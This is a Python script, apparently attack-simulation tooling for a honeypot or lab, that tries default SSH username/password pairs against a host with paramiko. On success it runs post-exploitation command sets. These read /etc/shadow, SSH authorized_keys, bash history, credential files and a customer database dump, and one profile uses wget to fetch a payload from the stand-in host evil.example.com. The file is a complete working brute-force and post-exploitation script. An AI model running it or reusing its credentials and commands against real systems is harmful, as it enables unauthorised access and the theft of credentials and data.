#!/usr/bin/env python3
"""
postex_ssh.py — Post-exploitation SSH simulation via paramiko.
Reuses the heavy command sets from simulate_attack.py but organised by profile.
Usage: python3 postex_ssh.py <host> <port> <profile>
Profiles: light | heavy | backup | root_escalate | exfil | recon
"""
import sys, time
import paramiko

host = sys.argv[1]
port = int(sys.argv[2])
profile = sys.argv[3] if len(sys.argv) > 3 else "light"

# Per-profile username/password pairs and command sets
PROFILES = {
    "light": {
        "credentials": [("root", "password"), ("admin", "admin123"), ("backup", "backup123")],
        "commands": ["id", "uname -a", "ls /home", "whoami"],
    },
    "recon": {
        "credentials": [("ubuntu", "ubuntu"), ("pi", "raspberry")],
        "commands": ["id", "uname -a"],
    },
    "backup": {
        "credentials": [("backup", "backup123"), ("backup", "password"), ("admin", "admin")],
        "commands": [
            "id", "ls /home/admin", "cat /home/admin/credentials.txt",
            "ls /var/backups", "cat /var/backups/customer_db.sql",
            "ls /opt/scripts",
        ],
    },
    "heavy": {
        "credentials": [("root", "password"), ("admin", "admin"), ("backup", "backup123")],
        "commands": [
            "id", "uname -a", "whoami", "ls -la /home",
            "ls -la /home/admin", "cat /home/admin/credentials.txt",
            "ls /var/backups", "cat /var/backups/customer_db.sql",
            "ls /opt/scripts", "cat /opt/scripts/backup_mysql.sh",
            "find / -name '*.sql' 2>/dev/null",
            "cat /home/admin/.bash_history",
            "cat /home/admin/.ssh/authorized_keys",
            "cat /root/deploy.sh",
        ],
    },
    "root_escalate": {
        "credentials": [("backup", "backup123"), ("root", "password"), ("admin", "admin123")],
        "commands": [
            "id", "uname -a", "cat /etc/passwd", "cat /etc/shadow 2>/dev/null",
            "sudo -l 2>/dev/null", "ls -la /root 2>/dev/null",
            "cat /home/admin/credentials.txt", "cat /root/deploy.sh",
            "cat /home/admin/.ssh/authorized_keys",
        ],
    },
    "exfil": {
        "credentials": [("backup", "backup123"), ("root", "password"), ("admin", "admin")],
        "commands": [
            "id", "uname -a", "cat /home/admin/credentials.txt",
            "cat /var/backups/customer_db.sql", "cat /opt/scripts/backup_mysql.sh",
            "cat /root/deploy.sh", "cat /home/admin/.bash_history",
            "wget http://evil.example.com/payload.sh 2>/dev/null || true",
            "find / -name 'credentials*' 2>/dev/null",
        ],
    },
}

config = PROFILES.get(profile, PROFILES["light"])

def try_connect(uname, passwd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            host, port=port, username=uname, password=passwd,
            timeout=6, banner_timeout=10, auth_timeout=6,
            look_for_keys=False, allow_agent=False
        )
        return client
    except paramiko.AuthenticationException:
        print(f"[postex] AUTH FAIL: {uname}:{passwd}")
        return None
    except Exception as e:
        print(f"[postex] ERROR: {uname}:{passwd} — {e}")
        return None
    finally:
        # If connect failed, close is a no-op
        pass

connected = False
for uname, passwd in config["credentials"]:
    print(f"[postex] Trying {uname}:{passwd}")
    client = try_connect(uname, passwd)
    if client:
        print(f"[postex] SUCCESS: {uname}:{passwd}")
        connected = True
        for cmd in config["commands"]:
            try:
                print(f"[postex]   $ {cmd}")
                stdin, stdout, stderr = client.exec_command(cmd, timeout=4)
                out = stdout.read(1024).decode(errors="replace").strip()
                if out:
                    print(f"[postex]   > {out[:120]}")
                time.sleep(0.5)
            except Exception:
                pass
        client.close()
        break
    time.sleep(0.5)

if not connected:
    print(f"[postex] No credentials worked for profile '{profile}'")
